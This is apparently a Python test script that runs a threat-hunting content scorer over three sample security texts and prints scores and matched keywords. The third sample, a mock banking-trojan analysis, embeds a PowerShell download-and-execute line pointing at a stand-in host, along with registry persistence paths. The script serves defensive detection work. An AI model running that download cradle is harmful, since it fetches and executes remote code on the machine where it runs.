#!/usr/bin/env python3
"""
Test script to demonstrate the new threat hunting scoring mechanism.
"""

import sys
import os
sys.path.append(os.path.join(os.path.dirname(__file__), 'src'))

from src.utils.content import ThreatHuntingScorer

def test_threat_hunting_scoring():
    """Test the threat hunting scoring with sample content."""
    
    # Sample 1: High-quality threat hunting content
    sample1_title = "New Ransomware Campaign Uses rundll32.exe for Persistence"
    sample1_content = """
    Security researchers have identified a new ransomware campaign that leverages 
    rundll32.exe for persistence mechanisms. The malware creates registry entries 
    in HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run 
    and uses PowerShell.exe to execute additional payloads.
    
    The attack chain involves:
    1. Initial access via phishing
    2. Execution of rundll32.exe with malicious DLL
    3. Creation of persistence in %APPDATA%\\malware.dll
    4. Lateral movement using wmic commands
    
    Technical indicators:
    - CVE-2024-1234
    - MD5: a1b2c3d4e5f678901234567890123456
    - IP: 192.168.1.100
    - Registry path: HKLM\\Software\\Malware\\Config
    """
    
    # Sample 2: General security news
    sample2_title = "Company Announces New Security Product"
    sample2_content = """
    A leading cybersecurity company has announced the launch of their new 
    security platform designed to protect enterprises from various threats.
    
    The platform includes features such as:
    - Advanced threat detection
    - Real-time monitoring
    - Automated response capabilities
    
    "We're excited to help organizations improve their security posture," 
    said the company's CEO.
    """
    
    # Sample 3: Malware analysis with technical details
    sample3_title = "Analysis of Banking Trojan Using lsass.exe Injection"
    sample3_content = """
    Our analysis reveals a sophisticated banking trojan that injects code into 
    lsass.exe process to evade detection. The malware uses the following techniques:
    
    Command execution:
    ```powershell
    iex (New-Object Net.WebClient).DownloadString("http://malware.com/payload.ps1")
    ```
    
    Registry persistence:
    - HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Malware
    - Value: "C:\\Windows\\System32\\rundll32.exe" "C:\\temp\\malware.dll,Start"
    
    File indicators:
    - %WINDIR%\\System32\\malware.dll
    - %APPDATA%\\temp\\config.bat
    
    Network indicators:
    - C2: 10.0.0.1:443
    - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
    """
    
    samples = [
        ("High-Quality Threat Hunting", sample1_title, sample1_content),
        ("General Security News", sample2_title, sample2_content),
        ("Technical Malware Analysis", sample3_title, sample3_content)
    ]
    
    print("Threat Hunting Scoring Demonstration")
    print("=" * 50)
    
    for name, title, content in samples:
        print(f"\n📄 {name}")
        print("-" * 30)
        
        result = ThreatHuntingScorer.score_threat_hunting_content(title, content)
        
        print(f"Threat Hunting Score: {result['threat_hunting_score']}/100")
        print(f"Technical Depth Score: {result['technical_depth_score']}/30")
        print(f"Keyword Density: {result['keyword_density']} per 1000 words")
        
        if result['perfect_keyword_matches']:
            print(f"Perfect Keywords Found: {', '.join(result['perfect_keyword_matches'])}")
        
        if result['good_keyword_matches']:
            print(f"Good Keywords Found: {', '.join(result['good_keyword_matches'])}")
        
        # Score interpretation
        if result['threat_hunting_score'] >= 80:
            print("🎯 EXCELLENT - High-quality threat hunting content")
        elif result['threat_hunting_score'] >= 60:
            print("🟡 GOOD - Decent threat hunting content")
        elif result['threat_hunting_score'] >= 40:
            print("🟠 FAIR - Some threat hunting elements")
        else:
            print("🔴 POOR - Limited threat hunting value")

if __name__ == "__main__":
    test_threat_hunting_scoring()
